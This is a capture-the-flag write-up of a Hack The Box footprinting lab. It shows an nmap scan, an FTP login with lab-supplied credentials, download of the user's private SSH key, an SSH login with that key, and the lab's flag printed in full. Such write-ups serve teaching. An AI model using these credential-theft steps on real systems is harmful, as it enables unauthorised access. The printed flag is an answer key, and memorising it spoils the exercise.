### Footprinting Easy Lab Exercise
 
IP: 10.129.77.225
 
---
 
### Question 1:
Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.
 
I start off with an nmap scan against the target, finding open ports that I can check out.
 
```diff
+ $ nmap -A -sV -sC -Pn -n 10.129.77.225
```
 
	PORT     STATE SERVICE VERSION
	21/tcp   open  ftp
	| fingerprint-strings:
	|   GenericLines:
	|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.77.225]
	|     Invalid command: try being more creative
	|     Invalid command: try being more creative
	|   SIPOptions:
	|_    220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.77.225]
	22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey:
	|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
	|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
	|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
	53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
	| dns-nsid:
	|_  bind.version: 9.16.1-Ubuntu
	2121/tcp open  ftp
	| fingerprint-strings:
	|   GenericLines:
	|     220 ProFTPD Server (Ceil's FTP) [10.129.77.225]
	|     Invalid command: try being more creative
	|_    Invalid command: try being more creative
 
I notice the FTP server whose name is "Ceil's FTP," and in the lab's description it speaks of Ceil's credentials being found by another teammate, so I test to see if I can connect using them.
 
```diff
+ $ ftp -P 2121 ceil@10.129.77.225
```
 
	Connected to 10.129.77.225.
	220 ProFTPD Server (Ceil's FTP) [10.129.77.225]
	331 Password required for ceil
	230 User ceil logged in
	Remote system type is UNIX.
	Using binary mode to transfer files.
 
From here I use `ls` and see that there's nothing, so I immediately think to `ls -la` to see any hidden files.
 
```diff
+ ftp> ls -la
```
 
	229 Entering Extended Passive Mode (|||21161|)
	150 Opening ASCII mode data connection for file list
	drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
	drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
	-rw-------   1 ceil     ceil          386 Jul 29 22:16 .bash_history
	-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
	-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
	drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
	-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
	drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
	-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
 
Navigating into .ssh, I can see that the id_rsa is there, so I use the `get` command and exit.
 
```diff
+ ftp> cd .ssh
+ ftp> get id_rsa
+ ftp> exit
```
 
Afterwards I `chmod` the file using 600 and then pass it to ssh while connecting to Ceil.
 
```diff
+ $ chmod 600 id_rsa
+ $ ssh -i id_rsa ceil@10.129.77.225
```
 
	ceil@NIXEASY:~$
 
Now that I have SSH'd into Ceil's user, I check out their home directory, which there isn't much in, but I notice their bash history. Taking a look at it reveals that they made a flag folder nearby and put the flag inside. I navigate into my parent directory and see the flag folder.
 
```diff
+ ceil@NIXEASY:~$ cd ..
+ ceil@NIXEASY:/home$ ls
+ ceil@NIXEASY:/home$ cd flag
+ ceil@NIXEASY:/home/flag$ ls
+ ceil@NIXEASY:/home/flag$ cat flag.txt
```
 
	ceil  cry0l1t3  flag
	flag.txt
	HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
 
&#x1F6A9; found **HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}**.

